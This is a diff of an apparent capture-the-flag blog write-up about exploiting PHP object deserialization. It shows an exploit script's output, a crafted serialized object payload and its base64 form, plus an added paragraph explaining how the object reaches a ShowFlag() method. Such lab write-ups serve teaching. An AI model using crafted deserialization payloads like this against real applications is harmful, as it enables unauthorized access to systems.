@@ -86,7 +86,7 @@ $obj->action = "ShowFlag";
 echo serialize($obj);
 {% endhighlight %}
 
-{% highlight %}
+{% highlight bash %}
 root@kali:~/Challenge41# php sploit.php 
 O:11:"RandomClass":1:{s:20:"RandomClassuStruct";O:8:"stdClass":3:{s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";s:6:"action";s:8:"ShowFlag";}}
 
@@ -108,3 +108,6 @@ NjoiYWN0aW9uIjtzOjg6IlNob3dGbGFnIjt9fQ==
 
 {% endhighlight %}
 
+Based on a review of the code, this object we have constructed should be suitable to reach the ShowFlag() method properly, considering that **(a)** $this->uStruct->time is not null, **(b)** $this->uStruct->flag is set to 'Please?', and **(c)** $obj->action is set to 'ShowFlag'. Sending this payload results in the flag being displayed on the page.
+
+![Flag]({{ site.baseurl }}/images/rz-flag.png)
